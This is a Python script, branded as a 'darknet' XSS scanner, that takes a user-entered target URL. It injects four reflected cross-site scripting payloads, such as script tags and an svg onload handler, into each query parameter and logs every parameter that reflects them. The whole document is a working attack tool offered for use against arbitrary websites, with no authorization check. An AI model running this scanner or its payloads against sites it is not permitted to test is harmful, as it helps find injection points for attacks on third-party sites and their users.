import requests
from urllib.parse import urlparse, parse_qs, urlencode
from rich.console import Console
from datetime import datetime

console = Console()

console.print("[bold red]\n[ HELLENIC DARKNET XSS SCANNER ][/bold red]")
console.print("[green]Made by: 0xBL4CKH4T[/green]\n")

payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><svg onload=alert(1)>",
    "' onmouseover='alert(1)'",
]

def scan_xss(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        console.print("[yellow]No parameters in the URL![/yellow]")
        return

    for param in params:
        for payload in payloads:
            mod_params = params.copy()
            mod_params[param] = payload
            new_query = urlencode(mod_params, doseq=True)
            full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                r = requests.get(full_url, timeout=10)
                if payload in r.text:
                    console.print(f"[bold green][+] XSS Found in '{param}' with payload: {payload}[/bold green]")
                    with open("logs/xss_vulns.txt", "a") as f:
                        f.write(f"[{datetime.now()}] {param} => {payload} @ {full_url}\n")
                else:
                    console.print(f"[blue][-] Not vulnerable: {param} with payload: {payload}[/blue]")

            except Exception as e:
                console.print(f"[yellow][!] Error: {e}[/yellow]")

def main():
    target = input("Enter target URL (with parameter): ").strip()
    scan_xss(target)

if __name__ == "__main__":
    main()
